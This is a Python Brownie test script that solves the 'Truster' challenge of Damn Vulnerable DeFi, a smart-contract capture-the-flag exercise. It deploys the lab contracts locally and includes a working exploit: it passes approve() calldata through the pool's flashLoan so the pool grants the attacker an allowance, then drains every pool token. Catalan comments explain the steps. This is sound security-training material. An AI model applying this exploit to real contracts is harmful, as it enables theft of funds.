from brownie import accounts, DamnValuableToken, TrusterLenderPool
from brownie.network.account import Account


def test_truster():
    deployer: Account = accounts[0]
    attacker: Account = accounts[1]
    TOKENS_IN_POOL = 1000000e18

    token = DamnValuableToken.deploy({"from": deployer})
    pool = TrusterLenderPool.deploy(token.address, {"from": deployer})
    token.transfer(pool.address, TOKENS_IN_POOL, {"from": deployer})
    assert token.balanceOf(pool.address) == TOKENS_IN_POOL
    assert token.balanceOf(attacker.address) == 0
    # YOUR EXPLOIT GOES HERE
    # Fem que la pool que ofereix flashloans doni permisos el attacker utilitzan la funcion "approve" (revisa que fa la funcio approve)
    # Primer codifiquem la informacion amb encode_input per despres poderla utitlitzar a la EVM (solidity) fen el target.call().
    # Despres fem un transacion donantnos permisos i finalment transfer els diners de la seva conta a la del attacker.
    calldata = token.approve.encode_input(attacker.address,TOKENS_IN_POOL)
    pool.flashLoan(0,attacker.address,token.address,calldata,{"from":attacker})
    assert token.allowance(pool.address,attacker.address) == TOKENS_IN_POOL
    token.transferFrom(pool.address,attacker.address,TOKENS_IN_POOL,{"from":attacker})
    
    # SUCCESS CONDITIONS
    assert token.balanceOf(attacker.address) == TOKENS_IN_POOL
    assert token.balanceOf(pool.address) == 0
